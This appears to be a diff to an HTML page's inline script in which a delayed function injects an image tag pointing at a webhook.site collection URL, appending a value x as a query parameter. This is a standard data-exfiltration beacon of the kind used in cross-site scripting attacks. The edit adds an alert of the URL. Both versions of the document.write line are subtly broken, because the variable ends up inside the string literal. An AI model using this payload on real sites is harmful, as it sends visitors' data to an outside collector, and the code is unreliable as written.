@@ -12,8 +12,10 @@
 <script>
 function fuck(x){
 setTimeout(function () {
+var url='https://webhook.site/06a09bcb-3bee-4e80-8ff7-9be98620312a?a='+ x;
+alert(url);
         document.open();
-  document.write("<img src='https://webhook.site/06a09bcb-3bee-4e80-8ff7-9be98620312a?a='+ x>");
+  document.write("<img src=url>");
   document.close();
     }, 5000);
 }
